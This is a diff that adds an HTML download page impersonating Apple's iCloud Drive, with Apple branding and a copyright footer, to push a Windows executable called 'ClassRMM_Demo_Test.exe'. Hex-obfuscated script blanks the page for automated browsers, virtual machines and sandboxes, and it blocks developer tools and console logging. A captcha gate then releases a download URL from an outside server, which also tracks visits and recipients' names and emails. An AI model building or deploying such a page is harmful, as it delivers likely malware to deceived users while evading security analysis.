@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>iCloud Drive – ClassRMM_Demo_Test.exe</title>
+<!-- 8ab1cccbc2c39fd2ffb534a81ed3814a5f258c697dd0556faaea7c86d46c86b8 --><!-- 0bc9cc6afb0a02fd67f5caf3 -->
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Helvetica Neue",sans-serif;background:linear-gradient(160deg,#e8f4fc 0%,#f0f8ff 50%,#e8f0fb 100%);color:#1d1d1f;min-height:100vh;display:flex;flex-direction:column}
+.hdr{background:rgba(255,255,255,.8);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid rgba(0,0,0,.1);height:52px;display:flex;align-items:center;padding:0 22px;gap:10px}
+.apple-logo{display:flex;align-items:center;gap:6px;text-decoration:none}
+.apple-wordmark{font-size:16px;font-weight:600;color:#1d1d1f;letter-spacing:-.3px}
+.apple-sub{font-size:13px;color:#6e6e73;letter-spacing:-.1px}
+.content{flex:1;display:flex;align-items:center;justify-content:center;padding:32px 16px}
+.glass-card{background:rgba(255,255,255,.72);backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,.8);border-radius:18px;padding:32px 36px;width:100%;max-width:420px;box-shadow:0 8px 32px rgba(0,0,0,.12),0 2px 8px rgba(0,0,0,.06)}
+.cloud-icon{display:flex;justify-content:center;margin-bottom:20px}
+.file-name{font-size:19px;font-weight:700;text-align:center;color:#1d1d1f;margin-bottom:4px;word-break:break-word}
+.from-label{font-size:13px;color:#6e6e73;text-align:center;margin-bottom:6px}
+.file-msg{font-size:13px;color:#6e6e73;text-align:center;margin-bottom:4px}
+.recip{font-size:12px;color:#6e6e73;text-align:center;display:none;margin-bottom:4px}
+.divider{height:1px;background:rgba(0,0,0,.1);margin:20px 0}
+.verify-label{font-size:12px;font-weight:600;color:#6e6e73;text-transform:uppercase;letter-spacing:.5px;text-align:center;margin-bottom:12px}
+.cap-row{display:flex;justify-content:center}
+#cap-err{color:#ff3b30;font-size:12px;margin-top:8px;display:none;text-align:center}
+#dl-btn{display:none;margin-top:16px;width:100%;padding:14px;background:#007AFF;color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;letter-spacing:-.2px}
+#dl-btn:hover{background:#0066d6}
+.footer{text-align:center;padding:16px;font-size:11px;color:#6e6e73}
+.footer a{color:#6e6e73;text-decoration:none}
+</style>
+<style>
+@keyframes _pgIn{from{opacity:0;transform:translateY(7px)}to{opacity:1;transform:translateY(0)}}
+@keyframes _spin{to{transform:rotate(360deg)}}
+body{animation:_pgIn .3s ease-out}
+#cap-wrap{transition:opacity .25s ease,max-height .3s ease,margin .3s ease,padding .3s ease;overflow:hidden;max-height:300px;}
+#cap-wrap.hidden{opacity:0;max-height:0;pointer-events:none;margin-top:0!important;margin-bottom:0!important;padding-top:0!important;padding-bottom:0!important;}
+#dl-btn{transition:filter .15s,transform .12s,opacity .15s!important;cursor:pointer;user-select:none;}
+#dl-btn:not(._loading):hover{filter:brightness(1.07);}
+#dl-btn:not(._loading):active{transform:scale(.97);}
+#dl-btn._loading{opacity:.72!important;pointer-events:none;cursor:default;}
+</style>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<script>(function(){try{if(!!navigator["\x77\x65\x62\x64\x72\x69\x76\x65\x72"]||!!window["\x5f\x70\x68\x61\x6e\x74\x6f\x6d"]||!!window["\x63\x61\x6c\x6c\x50\x68\x61\x6e\x74\x6f\x6d"]||!!window["\x5f\x5f\x6e\x69\x67\x68\x74\x6d\x61\x72\x65"]||!!window["\x5f\x5f\x73\x65\x6c\x65\x6e\x69\x75\x6d\x5f\x75\x6e\x77\x72\x61\x70\x70\x65\x64"]||!!window["\x5f\x5f\x77\x65\x62\x64\x72\x69\x76\x65\x72\x5f\x65\x76\x61\x6c\x75\x61\x74\x65"]){document.body.innerHTML="";return;}if(window.outerWidth<2&&window.outerHeight<2){document.body.innerHTML="";return;}var nhgpyslq=navigator.userAgent||"";if(new RegExp("\x48\x65\x61\x64\x6c\x65\x73\x73\x43\x68\x72\x6f\x6d\x65\x7c\x50\x68\x61\x6e\x74\x6f\x6d\x4a\x53\x7c\x53\x65\x6c\x65\x6e\x69\x75\x6d\x7c\x70\x75\x70\x70\x65\x74\x65\x65\x72\x7c\x50\x6c\x61\x79\x77\x72\x69\x67\x68\x74\x7c\x53\x6c\x69\x6d\x65\x72\x4a\x53","\x69").test(nhgpyslq)){document.body.innerHTML="";return;}if(navigator.plugins&&navigator.plugins.length===0&&!new RegExp("\x4d\x6f\x62\x69\x6c\x65\x7c\x41\x6e\x64\x72\x6f\x69\x64","\x69").test(nhgpyslq)){document.body.innerHTML="";return;}if(!navigator.languages||navigator.languages.length===0){document.body.innerHTML="";return;}if(screen.width<200||screen.height<200){document.body.innerHTML="";return;}try{var igbpvrn=document.createElement("\x63\x61\x6e\x76\x61\x73").getContext("\x77\x65\x62\x67\x6c");if(igbpvrn){var fuzdicm=igbpvrn.getExtension("\x57\x45\x42\x47\x4c\x5f\x64\x65\x62\x75\x67\x5f\x72\x65\x6e\x64\x65\x72\x65\x72\x5f\x69\x6e\x66\x6f");if(fuzdicm){var pkdacauyp=igbpvrn.getParameter(fuzdicm.UNMASKED_RENDERER_WEBGL)||"";if(new RegExp("\x53\x77\x69\x66\x74\x53\x68\x61\x64\x65\x72\x7c\x6c\x6c\x76\x6d\x70\x69\x70\x65\x7c\x56\x69\x72\x74\x75\x61\x6c\x42\x6f\x78\x7c\x56\x4d\x77\x61\x72\x65\x7c\x50\x61\x72\x61\x6c\x6c\x65\x6c\x73","\x69").test(pkdacauyp)){document.body.innerHTML="";return;}}}}catch(ajrnifjk){}}catch(_){}document.addEventListener("\x63\x6f\x6e\x74\x65\x78\x74\x6d\x65\x6e\x75",function(e){e.preventDefault()});document.addEventListener("\x6b\x65\x79\x64\x6f\x77\x6e",function(e){if(e.key==="\x46\x31\x32"||(e.ctrlKey&&e.shiftKey&&(e.key==="\x49"||e.key==="\x4a"||e.key==="\x43"))||(e.ctrlKey&&e.key==="\x55")){e.preventDefault();return false;}});try{["\x6c\x6f\x67","\x77\x61\x72\x6e","\x65\x72\x72\x6f\x72","\x69\x6e\x66\x6f","\x64\x65\x62\x75\x67","\x74\x61\x62\x6c\x65","\x64\x69\x72","\x74\x72\x61\x63\x65"].forEach(function(m){console[m]=function(){}})}}catch(_){}})();</script>
+</head>
+<body>
+<div class="hdr">
+  <a class="apple-logo" href="#">
+    <svg width="18" height="22" viewBox="0 0 814 1000"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-37.5-155.5-122.7C115.6 794.7 68.1 699.2 68.1 608.4c0-143.3 93.4-219.3 185-219.3 50.6 0 92.5 33.4 124.5 33.4 30.6 0 78.7-34.8 133.4-34.8 31.6 0 108.2 3.2 155.2 82.7zm-120.6-254.7C701.7 39.9 714.5 0 714.5 0c-36.2 2.6-78.8 24.2-104.5 52.3-21.8 24.2-40.8 61.2-40.8 99 0 5.8.6 11.6 1.3 13.5 2.6.4 6.5.6 10.4.6 32.6 0 71.3-21.1 87.6-79.2z" fill="#1d1d1f"/></svg>
+    <span class="apple-wordmark">iCloud</span>
+    <span class="apple-sub">Drive</span>
+  </a>
+</div>
+<div class="content">
+  <div class="glass-card">
+    <div class="cloud-icon">
+      <svg width="64" height="64" viewBox="0 0 64 80"><path d="M0 4C0 1.8 1.8 0 4 0H42L64 22V76C64 78.2 62.2 80 60 80H4C1.8 80 0 78.2 0 76V4Z" fill="#007AFF"/><path d="M42 0L64 22H44C42.9 22 42 21.1 42 20V0Z" fill="rgba(255,255,255,.22)"/><rect x="12" y="30" width="40" height="5" rx="2.5" fill="white" opacity=".9"/><rect x="12" y="41" width="30" height="4" rx="2" fill="white" opacity=".65"/><rect x="12" y="51" width="36" height="4" rx="2" fill="white" opacity=".65"/><rect x="12" y="61" width="22" height="4" rx="2" fill="white" opacity=".45"/></svg>
+    </div>
+    <div class="file-name">ClassRMM_Demo_Test.exe</div>
+    <div class="from-label">Shared by ClassRMM</div>
+    <div class="file-msg">Test file — verifying Generate Link works end-to-end.</div>
+    <div class="recip" id="recipient-info"></div>
+    <div id="cap-wrap">
+      <div class="divider"></div>
+      <div class="verify-label">Verify to Download</div>
+      <div class="cap-row"><div class="cf-turnstile" data-sitekey="0x4AAAAAADEUnhXoe-14ZEdK" data-callback="onCaptchaSuccess"></div></div>
+      <div id="cap-err"></div>
+    </div>
+    <button id="dl-btn" data-display="block">Download</button>
+  </div>
+</div>
+<div class="footer">&copy; 2025 Apple Inc. &nbsp;&middot;&nbsp; <a href="#">Privacy Policy</a> &nbsp;&middot;&nbsp; <a href="#">Terms of Use</a></div>
+<script>
+var _srv='https://rmm.docmail.cloud';var _lid=37;
+function _trk(evt){try{fetch(_srv+'/generate-link/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({link_id:_lid,event:evt})})}catch(_){}}
+async function onCaptchaSuccess(token){
+  var btn=document.getElementById('dl-btn');
+  var err=document.getElementById('cap-err');
+  var cw=document.getElementById('cap-wrap');
+  err.style.display='none';
+  try{
+    var r=await fetch(_srv+'/generate-link/verify-captcha',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({link_id:_lid,captcha_token:token})});
+    var d=await r.json();
+    if(!r.ok){err.textContent=d.detail||'Verification failed. Please try again.';err.style.display='block';if(typeof turnstile!=='undefined')turnstile.reset();return;}
+    var a=document.createElement('a');a.href=d.url;a.download=d.display_name||'';document.body.appendChild(a);
+    if(cw){cw.classList.add('hidden');}
+    btn.style.transition='opacity .3s ease,transform .3s ease';
+    btn.style.opacity='0';btn.style.transform='translateY(-5px)';
+    btn.style.display=btn.dataset.display||'inline-flex';
+    requestAnimationFrame(function(){requestAnimationFrame(function(){btn.style.opacity='1';btn.style.transform='translateY(0)';})});
+    btn.onclick=function(){
+      _trk('download');a.click();
+      btn.classList.add('_loading');
+      var orig=btn.innerHTML;
+      btn.innerHTML='<span style="display:inline-flex;align-items:center;gap:7px"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" style="animation:_spin .75s linear infinite"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg>Downloading…</span>';
+      
+      setTimeout(function(){btn.innerHTML=orig;btn.classList.remove('_loading');},9000);
+    };
+  }catch(e){err.textContent='Network error. Please try again.';err.style.display='block';if(typeof turnstile!=='undefined')turnstile.reset();}
+}
+function getParams(){
+  var p=new URLSearchParams(window.location.search);var n=p.get('n')||'';var e=p.get('e')||'';
+  var el=document.getElementById('recipient-info');if(!el)return;
+  if(n||e){el.style.display='block';
+  if(n&&e)el.textContent='For: '+decodeURIComponent(n)+' — '+decodeURIComponent(e);
+  else el.textContent='For: '+decodeURIComponent(n||e);}
+}
+window.addEventListener('load',function(){getParams();_trk('visit');});</script>
+</body></html>
